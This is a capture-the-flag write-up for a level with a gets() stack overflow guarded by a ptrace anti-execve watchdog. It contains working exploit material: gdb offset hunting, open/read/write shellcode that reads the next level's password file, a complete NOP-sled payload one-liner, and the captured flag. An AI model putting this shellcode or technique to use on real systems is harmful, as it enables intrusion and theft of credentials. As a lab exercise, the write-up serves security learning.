@@ -1,0 +1,138 @@
+# Level04
+
+## Reconstructed source
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <sys/ptrace.h>
+#include <sys/prctl.h>
+#include <sys/wait.h>
+
+int main(void)
+{
+    char buffer[128];
+    int  status;
+    int  pid;
+
+    pid = fork();
+    if (pid == 0)
+    {
+        // child: reads our input
+        prctl(PR_SET_PDEATHSIG, SIGHUP);
+        ptrace(PTRACE_TRACEME, 0, 0, 0);
+        puts("Give me some shellcode, k");
+        gets(buffer);
+    }
+    else
+    {
+        // parent: traces the child, kills it if it calls execve
+        while (1)
+        {
+            wait(&status);
+            if (WIFEXITED(status) || WIFSIGNALED(status))
+            {
+                puts("child is exiting...");
+                break;
+            }
+            if (ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0) == 11)   // 11 = execve
+            {
+                puts("no exec() for you");
+                kill(pid, SIGKILL);
+                break;
+            }
+        }
+    }
+    return (0);
+}
+```
+
+(The binary also contains the helpers `get_unum` and `clear_stdin`, but `main`
+does not call them.)
+
+## Vulnerability
+
+Two things combine:
+
+1. **Stack buffer overflow** - the child reads input with `gets(buffer)`, which
+   is unbounded, into a 128-byte stack buffer. We overwrite the saved return
+   address of `main`. The stack is executable (`GNU_STACK ... RWE`, NX disabled),
+   so we can jump to shellcode placed in the overflowed buffer.
+
+2. **Anti-exec watchdog** - the parent traces the child via `ptrace`. On every
+   trap it reads the child's syscall number (`PTRACE_PEEKUSER` at offset `0x2c`,
+   i.e. `orig_eax`); if the child ever calls `execve` (syscall `11`) it prints
+   `no exec() for you` and kills it.
+
+So a classic `execve("/bin/sh")` shellcode is detected and killed. The way around
+it is shellcode that **never calls execve**: open/read/write the next password
+file directly. The parent only watches for syscall 11, so `open` (5), `read` (3)
+and `write` (4) all run freely.
+
+## Exploitation
+
+### Step 1 - offset to the return address
+
+A cyclic pattern finds the offset (debug the child with `follow-fork-mode child`;
+`ptrace(TRACEME)` fails harmlessly under gdb):
+
+```sh
+gdb ./level04
+(gdb) set follow-fork-mode child
+(gdb) run < /tmp/p4
+# Program received signal SIGSEGV
+(gdb) info registers eip        # eip = 0x4141416e  -> offset 156
+```
+
+### Step 2 - address of the buffer
+
+```sh
+(gdb) break *0x804875e          # the `call gets` instruction
+(gdb) run < /tmp/p4
+(gdb) info registers eax        # eax = 0xffffd670  -> &buffer
+```
+
+### Step 3 - open/read/write shellcode
+
+The shellcode runs entirely in the traced child (no execve, so the watchdog
+never fires):
+
+```
+open("/home/users/level05/.pass", O_RDONLY)   // syscall 5
+read(fd, buffer, 200)                          // syscall 3
+write(1, buffer, n)                            // syscall 4
+exit(0)                                        // syscall 1
+```
+
+```
+\xeb\x2e\x5e\x31\xc0\xb0\x05\x89\xf3\x31\xc9\x31\xd2\xcd\x80\x89\xc3
+\x31\xc0\xb0\x03\x89\xf1\xb2\xc8\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31
+\xdb\x43\x89\xf1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xcd\xff
+\xff\xff/home/users/level05/.pass\x00
+```
+
+### Step 4 - payload layout
+
+The return address points forward into a large NOP sled placed *after* it (gets
+reads the whole line). This makes the landing tolerant to the small address
+shift between gdb and the real run:
+
+```
+[ 156 x \x90 ][ ret addr ][ 200 x \x90 (sled) ][ shellcode ]
+                   |__ 0xffffd770 (buffer + 0x100, inside the sled)
+```
+
+```sh
+python -c 'print "\x90"*156 + "\x70\xd7\xff\xff" + "\x90"*200 + "\xeb\x2e\x5e\x31\xc0\xb0\x05\x89\xf3\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xf1\xb2\xc8\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\x89\xf1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xcd\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73\x00"' | ./level04
+# Give me some shellcode, k
+# 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+# child is exiting...
+```
+
+## Flag
+
+```txt
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
